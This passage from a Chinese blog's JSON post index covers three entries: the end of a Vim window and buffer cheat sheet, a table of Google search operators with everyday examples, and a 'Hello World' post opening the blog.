w：在分割窗口之间切换。\nCtrl + w, h/j/k/l：分别向左、下、上、右切换窗口。\n:q：关闭当前窗口。\n2. 多文件操作 :e filename：打开指定文件。\n:bnext 或 :bn：切换到下一个缓冲区（文件）。\n:bprev 或 :bp：切换到上一个缓冲区（文件）。\n:ls：列出所有缓冲区（打开的文件）。\n:bN：切换到缓冲区 N。\n","date":"2025-10-27T09:27:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/vim.webp","permalink":"https://www.retr0.xyz/p/vim%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Vim的使用"},{"content":" 指令 用法 示例 \u0026quot;\u0026quot;(引号) 用引号来查询一个确切的单词或短语 查找有关《百年孤独》这本书的网页，语法：\u0026ldquo;百年孤独\u0026rdquo; OR(或者) 用OR分隔搜索词，同时执行两个搜索查询，这将找到包含多个单词之一的页面。 搜索引用了“Google Drive”、“Dropbox”或“OneDrive”的页面，语法：Google Drive OR Dropbox OR OneDrive -(减号、连字符) 在单词或网站前使用连字符将其从搜索结果中排除 从搜索结果中排除维基百科页面，语法：- site:http://wikipedia.org allintext: 使用allintext:[搜索短语]查找正文中包含这些单词的页面 查找正文中有关Roth、IRA投资讯息的页面，语法：allintext:Roth IRA 投资 allintitle: 使用allintitle:[搜索短语]查找标题中包含这些单词的页面 查找标题中同时包含“Apple”和“notebook”的页面，语法：allintitle:Apple notebook allinurl: 使用allinurl:[搜索短语]查找URL中包含这些单词的页面 查找URL中同时包含”Microsoft” and “Surface”的页面，语法：allinurl:Microsoft Surface site: 使用site:[URL]将搜索结果限制到特定网站 查找云点SEO网关于谷歌SEO的页面，语法：site:http://yundianseo.com 谷歌SEO ~(波浪号) 使用波浪号获得目标关键词及其近似词的搜索结果 查找SEO方面的策略或者教程，语法：SEO ~教程 related: 使用related:[URL]查找与特定网站类似的网站 查找与云点SEO类似的网站，语法：related:http://yundianseo.com define: 使用define:[搜索短语]查找其定义 查找SEO的定义，语法：define:SEO $ 使用$查找特定价格的商品 查找一款售价在99美金的手机，语法：mobile phone $99 location: 使用location:[地点]查看某个地区内的相关信息 查询南京的酒店，语法：hotel location:Nanjing *（星号） 添加星号作为未知单词或事实的占位符 查找以“生活就像一个”开头的引语，语法：生活就像一个* filetype: 使用filetype:[后缀]将结果限制为特定的文件格式，如PDF或DOC。 查找PDF格式的Microsoft Office键盘快捷键相关文件，语法：filetype:pdf Microsoft Office键盘快捷键 ..（两点） 用两个句点分隔数字，不带空格，以搜索该范围内的数字 查找1950年至2000年间发生的计算机里程碑，语法：”计算机里程碑” 1950..2000 AROUND(n) 在两个搜索词之间加上AROUND(n)，以查找两个词间有特定距离的页面。用数字n设置术语之间的最大距离，这对于查找两个搜索词之间的关系很有用。 查找在同一句话或段落中提到Facebook和Microsoft的页面，语法：Facebook AROUND(7) Microsoft ","date":"2025-10-27T09:27:38+08:00","permalink":"https://www.retr0.xyz/p/%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/","title":"谷歌搜索语法"},{"content":"Hello World! 如果你能看到这篇文章，说明我的博客已经正常开通。\n总之，\n欢迎订阅！\n","date":"2025-10-26T23:13:26+08:00","permalink":"https://www.retr0.xyz/p/hello_world/","title":"Hello_world"}]